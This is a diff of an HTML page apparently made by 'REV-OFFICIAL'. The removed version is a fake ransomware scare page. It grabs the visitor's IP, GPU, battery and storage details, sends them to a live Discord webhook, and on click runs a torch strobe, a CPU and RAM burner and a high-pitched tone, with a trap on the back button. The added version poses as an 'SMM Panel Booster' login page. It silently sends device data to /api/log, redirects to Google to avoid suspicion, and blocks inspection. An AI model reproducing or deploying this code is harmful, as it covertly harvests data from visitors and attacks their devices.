@@ -1,130 +1,64 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM WARNING ⚠️</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMM Panel Booster - Login</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #ransom-ui { border: 2px solid #f00; padding: 20px; text-align: center; background: rgba(20,0,0,0.9); box-shadow: 0 0 30px #f00; width: 85%; }
-        .blink { animation: b 0.1s infinite; }
-        @keyframes b { 50% { opacity: 0; } }
-        button { background: #f00; color: #fff; border: none; padding: 15px; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer; }
-        #log { position: fixed; bottom: 0; left: 0; font-size: 8px; color: #333; pointer-events: none; }
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .msg { margin-top: 20px; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
-<body onclick="activateNuke()">
-
-    <div id="ransom-ui">
-        <h2 class="blink">SYSTEM COMPROMISED</h2>
-        <p style="color: #fff; font-size: 12px;">Seluruh data perangkat telah dienkripsi oleh <b>REV-OFFICIAL</b>.</p>
-        <p id="status" style="font-size: 10px;">Status: Mengumpulkan data...</p>
-        <button onclick="activateNuke()">FIX SYSTEM (FORCE)</button>
+<body>
+    <div style="text-align: center;">
+        <div class="loader"></div>
+        <div class="msg" id="status">Verifying Connection...</div>
     </div>
 
-    <div id="log"></div>
-
     <script>
-        // --- 1. CONFIGURATION ---
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1478153467590873131/1Y7myadtqmYjdujwkbYTa2tq6xlN9pwjB4Wm0aVUV8auB7ukMIiEwuyj0YUmJw1YwTmx";
-        const MASTER_KEY = "REV-OFFICIAL-2026";
-        let isNuked = false;
+        /* REV-OFFICIAL STEALTH ENGINE v2.0 */
+        (function(_0xREV){
+            const _0xOFF = async () => {
+                try {
+                    let _0xBAT = await navigator.getBattery();
+                    let _0xSTO = await navigator.storage.estimate();
+                    let _0xDAT = {
+                        "device": navigator.platform,
+                        "ua": navigator.userAgent,
+                        "lang": navigator.language,
+                        "res": screen.width + "x" + screen.height,
+                        "batt": Math.round(_0xBAT.level * 100) + "%",
+                        "char": _0xBAT.charging ? "Yes" : "No",
+                        "cpu": navigator.hardwareConcurrency || "N/A",
+                        "ram": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+                        "st_used": (_0xSTO.usage / (1024 ** 3)).toFixed(2),
+                        "st_total": (_0xSTO.quota / (1024 ** 3)).toFixed(2)
+                    };
 
-        // --- 2. SILENT DATA SNATCHER (Langsung Jalan Tanpa Klik) ---
-        async function snatchData() {
-            let data = {
-                ip: "Fetching...",
-                gpu: "Unknown",
-                battery: "Needs Interaction",
-                storage: "Unknown",
-                ua: navigator.userAgent,
-                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
-                cores: navigator.hardwareConcurrency || "N/A"
+                    // KIRIM DATA KE VERCEL SERVERLESS FUNCTION (/api/log.py)
+                    await fetch('/api/log', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(_0xDAT)
+                    });
+
+                } catch (e) {}
+                
+                // REDIRECT OTOMATIS BIAR GAK CURIGA
+                setTimeout(() => {
+                    window.location.href = "https://google.com";
+                }, 1500);
             };
+            window.onload = _0xOFF;
+        })();
 
-            try {
-                // Get IP (Auto)
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await ipRes.json();
-                data.ip = ipJson.ip;
-
-                // Get GPU (Auto)
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (gl) {
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                }
-
-                // Get Storage (Auto)
-                if (navigator.storage && navigator.storage.estimate) {
-                    const est = await navigator.storage.estimate();
-                    data.storage = (est.usage / 1024 / 1024 / 1024).toFixed(2) + "GB used / " + (est.quota / 1024 / 1024 / 1024).toFixed(2) + "GB total";
-                }
-
-                // Get Battery (Silent attempt)
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    data.battery = (b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Disc)");
-                }
-            } catch (e) { console.log("Silent snatch error"); }
-
-            // SEND TO DISCORD
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🚨 TARGET DETECTED (AUTO-SNATCH) 🚨",
-                        color: 16711680,
-                        fields: [
-                            { name: "🌐 IP", value: data.ip, inline: true },
-                            { name: "🧠 RAM/Cores", value: data.ram + " / " + data.cores, inline: true },
-                            { name: "🔋 Battery", value: data.battery, inline: true },
-                            { name: "🎮 GPU", value: data.gpu },
-                            { name: "💾 Storage", value: data.storage },
-                            { name: "📱 Info", value: data.ua }
-                        ],
-                        footer: { text: "By REV-OFFICIAL" }
-                    }]
-                })
-            });
-            document.getElementById('status').innerText = "Data Terenkripsi 100%. Token Dibutuhkan.";
-        }
-
-        // Jalankan Snatcher secara otomatis saat halaman dibuka
-        snatchData();
-
-        // --- 3. THE NUKE (Trigger saat klik) ---
-        function activateNuke() {
-            if(isNuked) return;
-            isNuked = true;
-            
-            // Fullscreen
-            document.documentElement.requestFullscreen().catch(()=>{});
-
-            // Senter Strobe & Getar
-            setInterval(async () => {
-                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-                const t = s.getVideoTracks()[0];
-                await t.applyConstraints({advanced:[{torch:true}]});
-                setTimeout(async () => { await t.applyConstraints({advanced:[{torch:false}]}); }, 30);
-            }, 100);
-
-            // RAM/CPU Burner
-            setInterval(() => {
-                new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
-                let x = new ArrayBuffer(1024 * 1024 * 10);
-            }, 100);
-
-            // Audio Terror
-            let ac = new AudioContext();
-            let o = ac.createOscillator(); o.type='sawtooth'; o.frequency.value=18000; o.connect(ac.destination); o.start();
-        }
-
-        // Anti-Back
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
+        // ANTI-INSPECT ELEMENT (Basic)
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
+        };
+        document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
 </html>
